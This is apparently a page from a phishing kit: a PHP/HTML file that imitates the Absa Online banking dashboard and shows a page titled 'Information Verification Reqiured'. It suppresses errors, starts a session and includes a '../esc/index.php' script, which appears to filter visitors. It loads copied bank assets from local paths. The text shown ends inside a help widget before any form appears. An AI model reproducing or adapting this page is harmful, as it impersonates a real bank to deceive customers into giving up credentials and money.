<?php
error_reporting(0);
session_start();
require_once '../esc/index.php';
?>
<!DOCTYPE html>

<html lang="en">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  <link rel="shortcut icon" type="image/x-icon" href="https://www.absa.co.za/etc/designs/zg/absacoza/desktop/assets/img/favicon.ico" />
  <title>Absa Online</title>
  <link rel="stylesheet" type="text/css" href="../libraries/lib/all.css">
  <script type="text/javascript" src="../libraries/lib/runtime_e189f4b4.js" defer=""></script>
  <script type="text/javascript" src="../libraries/lib/styles_e189f4b4.js" defer=""></script>
</head>

  <app-root _nghost-qws-c16="" ng-version="10.2.0" aria-hidden="true">
    <router-outlet _ngcontent-qws-c16=""></router-outlet>
    <app-cb-application _nghost-qws-c297="" class="ng-star-inserted">
      <div _ngcontent-qws-c297="" class="scroll-to-top"></div>
      <div _ngcontent-qws-c297="" fxlayout="column" fxlayoutalign="none" class="application" style="flex-direction: column; box-sizing: border-box; display: flex; place-content: stretch flex-start; align-items: stretch;">
        <app-custom-loader-spinner _ngcontent-qws-c297="" _nghost-qws-c29="">
          <div _ngcontent-qws-c29="" class="spinner-indicator" hidden="">
            <app-progress-spinner _ngcontent-qws-c29="" _nghost-qws-c28="">
              <div _ngcontent-qws-c28="" class="spinner-indicator" hidden=""></div>
              <div _ngcontent-qws-c28="">
                <div _ngcontent-qws-c28="">
                  <app-svg-spinner _ngcontent-qws-c28="" role="progressbar" _nghost-qws-c27="">
                    <div _ngcontent-qws-c27="" id="spinner-indicator">
                      <svg _ngcontent-qws-c27="" id="path1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 110" width="80px" height.px="80">
                        <path _ngcontent-qws-c27="" fill="#AF144B" d="M97.918 74.937l6.665 3.108c-8.738 18.706-27.717 31.67-49.726 31.67-22.01 0-40.988-12.964-49.725-31.67l6.664-3.108c7.567 16.199 24.002 27.425 43.061 27.425 19.06 0 35.494-11.226 43.06-27.425"></path>
                      </svg>
                      <svg _ngcontent-qws-c27="" id="path2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 110" width="80px" height.px="80">
                        <path _ngcontent-qws-c27="" fill="#FF780F" d="M99.508 71.109l6.911 2.515c2.132-5.855 3.295-12.175 3.295-18.767 0-6.592-1.163-12.912-3.295-18.767l-6.911 2.516c1.846 5.07 2.854 10.543 2.854 16.251 0 5.709-1.008 11.182-2.854 16.252z"></path>
                      </svg>
                      <svg _ngcontent-qws-c27="" id="path3" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 110" width="80px" height.px="80">
                        <path _ngcontent-qws-c27="" fill="#F0325A" d="M7.353 54.857c0-5.708 1.007-11.181 2.853-16.251l-6.91-2.516C1.163 41.945 0 48.265 0 54.857 0 61.45 1.164 67.77 3.295 73.624l6.911-2.515c-1.846-5.07-2.853-10.543-2.853-16.252"></path>
                      </svg>
                      <svg _ngcontent-qws-c27="" id="path4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 110" width="80px" height.px="80">
                        <path _ngcontent-qws-c27="" fill="#BE0028" d="M54.857 7.353c19.06 0 35.494 11.226 43.06 27.425l6.666-3.108C95.845 12.963 76.866 0 54.857 0 32.847 0 13.87 12.963 5.131 31.67l6.665 3.108c7.567-16.2 24.002-27.425 43.061-27.425"></path>
                      </svg>
                    </div>
                  </app-svg-spinner>
                </div>
              </div>
            </app-progress-spinner>
          </div>
        </app-custom-loader-spinner>
        <top-nav _ngcontent-qws-c297="" _nghost-qws-c231="">
          <nav _ngcontent-qws-c231="" ngclass.gt-sm="top-nav-gt-sm" class="top-nav top-nav-gt-sm">
            <a _ngcontent-qws-c231="" href="javascript:void(0);" skiplocationchange="true" class="top-nav__logo"><img _ngcontent-qws-c231="" src="../libraries/lib/logo-red.svg" class="top-nav__logo-img"></a>
            <a _ngcontent-qws-c231="" fxhide.gt-sm="" href="javascript:void(0);" class="menu-trigger hamburger-slice" style="display: none;">
              <div _ngcontent-qws-c231="" class="menu-trigger__icon hamburger-slice icon-menu"></div>
            </a>
            <div _ngcontent-qws-c231="" class="menu-primary ng-star-inserted">
              <div _ngcontent-qws-c231="" fxhide="" fxshow.gt-md="" tabindex="0" class="nav-button ng-star-inserted" id="Pay"><span _ngcontent-qws-c231="" class="icon-pay nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-Pay nav-button__label">Pay</span>
                <div _ngcontent-qws-c231="" class="nav-button__accent"></div>
                <div _ngcontent-qws-c231="" class="nav-dropdown ng-star-inserted">
                  <div _ngcontent-qws-c231="" class="nav-dropdown__content"><span _ngcontent-qws-c231="" class="nav-dropdown__item ng-star-inserted" tabindex="-1"> Single payment </span><span _ngcontent-qws-c231="" class="nav-dropdown__item last ng-star-inserted" tabindex="-1"> Multiple payments </span></div>
                </div>
                <div _ngcontent-qws-c231="" class="nav-dropdown__arrow ng-star-inserted"></div>
              </div>
              <div _ngcontent-qws-c231="" fxhide="" fxshow.gt-md="" tabindex="0" class="nav-button ng-star-inserted" id="Transfer"><span _ngcontent-qws-c231="" class="icon-transfer nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-Transfer nav-button__label">Transfer</span>
                <div _ngcontent-qws-c231="" class="nav-button__accent"></div>
              </div>
              <div _ngcontent-qws-c231="" fxhide="" fxshow.gt-md="" tabindex="0" class="nav-button ng-star-inserted" id="Buy"><span _ngcontent-qws-c231="" class="icon-buy nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-Buy nav-button__label">Buy</span>
                <div _ngcontent-qws-c231="" class="nav-button__accent"></div>
                <div _ngcontent-qws-c231="" class="nav-dropdown ng-star-inserted">
                  <div _ngcontent-qws-c231="" class="nav-dropdown__content"><span _ngcontent-qws-c231="" class="nav-dropdown__item ng-star-inserted" tabindex="-1"> PrePaid airtime and data </span><span _ngcontent-qws-c231="" class="nav-dropdown__item ng-star-inserted" tabindex="-1"> PrePaid electricity </span><span _ngcontent-qws-c231="" class="nav-dropdown__item last ng-star-inserted" tabindex="-1"> Lotto &amp; Powerball </span></div>
                </div>
                <div _ngcontent-qws-c231="" class="nav-dropdown__arrow ng-star-inserted"></div>
              </div>
              <div _ngcontent-qws-c231="" fxhide="" fxshow.gt-md="" tabindex="0" class="nav-button ng-star-inserted" id="CashSend"><span _ngcontent-qws-c231="" class="icon-cashsend nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-CashSend nav-button__label">CashSend</span>
                <div _ngcontent-qws-c231="" class="nav-button__accent"></div>
                <div _ngcontent-qws-c231="" class="nav-dropdown ng-star-inserted">
                  <div _ngcontent-qws-c231="" class="nav-dropdown__content"><span _ngcontent-qws-c231="" class="nav-dropdown__item ng-star-inserted" tabindex="-1"> CashSend beneficiaries </span><span _ngcontent-qws-c231="" class="nav-dropdown__item last ng-star-inserted" tabindex="-1"> Unredeemed CashSend </span></div>
                </div>
                <div _ngcontent-qws-c231="" class="nav-dropdown__arrow ng-star-inserted"></div>
              </div>
            </div>
            <div _ngcontent-qws-c231="" fxhide="" fxshow.gt-xs="" class="menu-secondary"><a _ngcontent-qws-c231="" role="link" class="nav-button ng-star-inserted" href="javascript:void(0);"><span _ngcontent-qws-c231="" class="icon-beneficiary nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-Profile nav-button__label">Profile</span></a><a _ngcontent-qws-c231="" role="link" class="nav-button ng-star-inserted" href="javascript:void(0);"><span _ngcontent-qws-c231="" class="icon-gears-settings nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-Settings nav-button__label">Settings</span></a><a _ngcontent-qws-c231="" role="link" class="nav-button ng-star-inserted" href="javascript:void(0);"><span _ngcontent-qws-c231="" class="icon-fullservice nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-Full nav-button__label service">Full service</span></a><a _ngcontent-qws-c231="" role="link" class="nav-button ng-star-inserted" href="javascript:void(0);"><span _ngcontent-qws-c231="" class="icon-logout nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-Logout nav-button__label">Logout</span></a></div>
            <div _ngcontent-qws-c231="" fxhide.gt-xs="" class="menu-secondary" style="display: none;"><a _ngcontent-qws-c231="" role="link" class="nav-button ng-star-inserted" href="javascript:void(0);"><span _ngcontent-qws-c231="" class="icon-logout nav-button__icon"></span><span _ngcontent-qws-c231="" class="label-Logout nav-button__label">Logout</span></a></div>
          </nav>
          <div _ngcontent-qws-c231=""></div>
        </top-nav>
        <div _ngcontent-qws-c297="" ngclass="application__side-bar--collapsed" ngclass.gt-sm="application__side-bar-gt-sm" ngclass.gt-md="" class="application__side-bar">
          <side-nav _ngcontent-qws-c297="" _nghost-qws-c230="" class="ng-tns-c230-0">
            <div _ngcontent-qws-c230="" class="ng-tns-c230-0"></div>
            <nav _ngcontent-qws-c230="" fxhide.gt-sm="" class="side-nav ng-tns-c230-0 ng-trigger ng-trigger-openClose" style="display: none; transform: translateX(0px);">
              <div _ngcontent-qws-c230="" class="side-nav-inner ng-tns-c230-0">
                <div _ngcontent-qws-c230="" class="side-nav-body ng-tns-c230-0">
                  <div _ngcontent-qws-c230="" class="side-nav-top ng-tns-c230-0">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" skiplocationchange="true" class="side-nav-logo ng-tns-c230-0"><img _ngcontent-qws-c230="" src="../libraries/lib/logo-red.svg" class="ng-tns-c230-0"></a>
                    <a _ngcontent-qws-c230="" class="side-nav-close ng-tns-c230-0">
                      <div _ngcontent-qws-c230="" class="side-nav-close-icon ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0">&nbsp;</span><span _ngcontent-qws-c230="" class="ng-tns-c230-0">&nbsp;</span><span _ngcontent-qws-c230="" class="ng-tns-c230-0">&nbsp;</span></div>
                    </a>
                  </div>
                  <div _ngcontent-qws-c230="" class="surephrase-hamburger ng-tns-c230-0">
                    <app-surephrase _ngcontent-qws-c230="" class="ng-tns-c230-0" _nghost-qws-c194="">
                      <div _ngcontent-qws-c194="" ngclass.gt-sm="wrapper-gt-sm" ngclass.gt-md="wrapper-gt-md" ngclass.gt-lg="wrapper-gt-lg" class="wrapper wrapper-gt-lg">
                        <div _ngcontent-qws-c194="" fxshow="" fxhide.gt-xs="" fxshow.gt-md=""><?php date_default_timezone_set("Africa/Cairo"); echo date("D, d M Y"); echo " | "; echo date("h:i:s"); ?></div>
                        <div _ngcontent-qws-c194="" fxshow="" fxhide.gt-xs="" fxshow.gt-md="">Your security SurePhrase™ is : <span _ngcontent-qws-c194="" class="surephrase">PRIVATE</span></div>
                        <div _ngcontent-qws-c194="" fxhide="" fxshow.gt-xs="" fxhide.gt-md="" style="display: none;"><?php date_default_timezone_set("Africa/Cairo"); echo date("D, d M Y"); echo " | "; echo date("h:i:s"); ?><span _ngcontent-qws-c194="" class="divider">|</span>Your security SurePhrase™ is : <span _ngcontent-qws-c194="" class="surephrase">PRIVATE</span></div>
                      </div>
                    </app-surephrase>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Dashboard Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-home nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Dashboard</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Accounts Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-card nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Accounts</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Transact Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-wallet-money nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Transact</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Beneficiaries Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-ops_team nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Beneficiaries</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <div _ngcontent-qws-c230="" class="side-nav-divider side-nav-divider-hamburger ng-tns-c230-0 ng-star-inserted"></div>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Rewards Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-rewards nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Rewards</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Insurance Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-insurance nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Insurance</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Offers Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-clipboard-tick nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Offers</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <div _ngcontent-qws-c230="" class="side-nav-divider side-nav-divider-hamburger ng-tns-c230-0 ng-star-inserted"></div>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Profile Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-beneficiary nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Profile</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Settings Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-gears-settings nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Settings</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" role="link" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" href="javascript:void(0);" aria-label="Full service Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-fullservice nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Full service</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="">
                    <div _ngcontent-qws-c230="" class="side-nav-divider side-nav-divider-hamburger ng-tns-c230-0 ng-star-inserted"></div>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 last ng-star-inserted" style="">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Contact us Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-phone nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label ng-tns-c230-0">Contact us</span></a>
                  </div>
                </div>
                <div _ngcontent-qws-c230="" class="side-nav-footer ng-tns-c230-0"></div>
              </div>
            </nav>
            <nav _ngcontent-qws-c230="" fxhide="" fxshow.gt-sm="" class="side-nav side-nav-gt-sm ng-tns-c230-0">
              <div _ngcontent-qws-c230="" class="side-nav-inner ng-tns-c230-0">
                <div _ngcontent-qws-c230="" class="ng-tns-c230-0 side-nav-body">
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Dashboard Page" style="background-color: #af144b!important;text-decoration: none;color: #fff!important;">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-home nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Dashboard</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Accounts Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-card nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Accounts</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Transact Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-wallet-money nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Transact</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Beneficiaries Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-ops_team nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Beneficiaries</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <div _ngcontent-qws-c230="" class="side-nav-divider ng-tns-c230-0 ng-star-inserted"></div>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Rewards Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-rewards nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Rewards</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Insurance Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-insurance nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Insurance</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Offers Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-clipboard-tick nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Offers</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="display: none;">
                    <div _ngcontent-qws-c230="" class="side-nav-divider ng-tns-c230-0 ng-star-inserted"></div>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="display: none;">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Profile Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-beneficiary nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Profile</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="display: none;">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Settings Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-gears-settings nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Settings</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted" style="display: none;">
                    <a _ngcontent-qws-c230="" role="link" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" href="javascript:void(0);" aria-label="Full service Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-fullservice nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Full service</span></a>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 ng-star-inserted">
                    <div _ngcontent-qws-c230="" class="side-nav-divider ng-tns-c230-0 ng-star-inserted"></div>
                  </div>
                  <div _ngcontent-qws-c230="" class="ng-tns-c230-0 last ng-star-inserted">
                    <a _ngcontent-qws-c230="" href="javascript:void(0);" routerlinkactive="nav-item-active" role="link" skiplocationchange="true" class="nav-item nav-item-flex-direction ng-tns-c230-0 ng-star-inserted" tabindex="0" aria-label="Contact us Page">
                      <div _ngcontent-qws-c230="" class="nav-item-icon-container ng-tns-c230-0"><span _ngcontent-qws-c230="" class="ng-tns-c230-0 icon-phone nav-item-icon"></span></div><span _ngcontent-qws-c230="" class="nav-item-label nav-item-label-gt-sm ng-tns-c230-0">Contact us</span></a>
                  </div>
                </div>
                <div _ngcontent-qws-c230="" class="more-slider top ng-tns-c230-0" style="display: none;"><span _ngcontent-qws-c230="" class="icon icon-arrow-back ng-tns-c230-0"></span><span _ngcontent-qws-c230="" class="more-text ng-tns-c230-0">More</span></div>
                <div _ngcontent-qws-c230="" class="more-slider ng-tns-c230-0" style="display: none;"><span _ngcontent-qws-c230="" class="icon icon-arrow-forward ng-tns-c230-0"></span><span _ngcontent-qws-c230="" class="more-text ng-tns-c230-0">More</span></div>
                <div _ngcontent-qws-c230="" class="side-nav-footer ng-tns-c230-0"></div>
              </div>
            </nav>
          </side-nav>
        </div>
        <div _ngcontent-qws-c297="" fxlayout="column" fxlayoutalign="space-around stretch" class="application__body ng-star-inserted application__body_opened_dialog" style="flex-direction: column; box-sizing: border-box; display: flex; place-content: stretch space-around; align-items: stretch; max-width: 100%;">
          <div _ngcontent-qws-c297="" class="application__content application__body_opened_dialog">
            <router-outlet _ngcontent-qws-c297=""></router-outlet>
            <app-pay-transaction-page _nghost-qws-c641="" class="ng-star-inserted">
              <div _ngcontent-qws-c641="" class="transactional-template">
                <div _ngcontent-qws-c641="" class="transactional-template__header container-header">
                  <page-header _ngcontent-qws-c641="" _nghost-qws-c196="" class="ng-tns-c196-8">
                    <div _ngcontent-qws-c196="" class="ng-tns-c196-8 page-header page-header-group ng-trigger ng-trigger-slideDownAnimation transactional" style="position: static; display: block;">
                      <page-title _ngcontent-qws-c641="" _nghost-qws-c195="" class="ng-tns-c196-8">
                        <div _ngcontent-qws-c195="">
                          <div _ngcontent-qws-c195="" fxlayout="column-reverse" fxlayout.gt-md="row" fxlayoutalign="start" fxlayoutalign.gt-md="space-between center" fxlayoutgap="0" fxlayoutgap.gt-md="8px" class="container-fluid override-container-fluid override-container-fluid-gt-sm ng-star-inserted" style="flex-direction: row; box-sizing: border-box; display: flex; place-content: center space-between; align-items: center;">
                            <div _ngcontent-qws-c195="" fxlayout="row" fxlayoutalign="start center" style="margin-right: 8px; flex-direction: row; box-sizing: border-box; display: flex; place-content: center flex-start; align-items: center;">
                              <div _ngcontent-qws-c195="" class="title-text title-text-gt-md">Information Verification Reqiured</div>
                            </div>
                            <app-surephrase _ngcontent-qws-c195="" fxhide="" fxshow.gt-sm="" _nghost-qws-c194="">
                              <div _ngcontent-qws-c194="" ngclass.gt-sm="wrapper-gt-sm" ngclass.gt-md="wrapper-gt-md" ngclass.gt-lg="wrapper-gt-lg" class="wrapper wrapper-gt-lg">
                                <div _ngcontent-qws-c194="" fxshow="" fxhide.gt-xs="" fxshow.gt-md=""><?php date_default_timezone_set("Africa/Cairo"); echo date("D, d M Y"); echo " | "; echo date("h:i:s"); ?></div>
                                <div _ngcontent-qws-c194="" fxshow="" fxhide.gt-xs="" fxshow.gt-md="">Your security SurePhrase™ is : <span _ngcontent-qws-c194="" class="surephrase">PRIVATE</span></div>
                                <div _ngcontent-qws-c194="" fxhide="" fxshow.gt-xs="" fxhide.gt-md="" style="display: none;"><?php date_default_timezone_set("Africa/Cairo"); echo date("D, d M Y"); echo " | "; echo date("h:i:s"); ?><span _ngcontent-qws-c194="" class="divider">|</span>Your security SurePhrase™ is : <span _ngcontent-qws-c194="" class="surephrase">PRIVATE</span></div>
                              </div>
                            </app-surephrase>
                          </div>
                        </div>
                      </page-title>
                    </div>
                    <div _ngcontent-qws-c196="" fxhide.gt-xs="" class="scroll-space ng-tns-c196-8" style="height: 116px; display: none;"></div>
                  </page-header>
                </div>
                <div _ngcontent-qws-c641="" class="container-fluid"></div>
              </div>
            </app-pay-transaction-page>
            <app-help _ngcontent-qws-c297="" _nghost-qws-c179="" class="ng-tns-c179-2 ng-star-inserted"><a _ngcontent-qws-c179="" href="javascript:void(0);" class="help-trigger-container ng-tns-c179-2"><span _ngcontent-qws-c179="" class="help-icon icon-help ng-tns-c179-2"></span><span _ngcontent-qws-c179="" class="help-text ng-tns-c179-2">Help</span></a>
              <div _ngcontent-qws-c179="" class="help-content-container ng-tns-c179-2 is-hidden ng-star-inserted is-loaded"><a _ngcontent-qws-c179="" href="javascript:void(0);" tabindex="-1" class="btn-close ng-tns-c179-2"><span _ngcontent-qws-c179="" class="icon icon-close ng-tns-c179-2"></span></a>
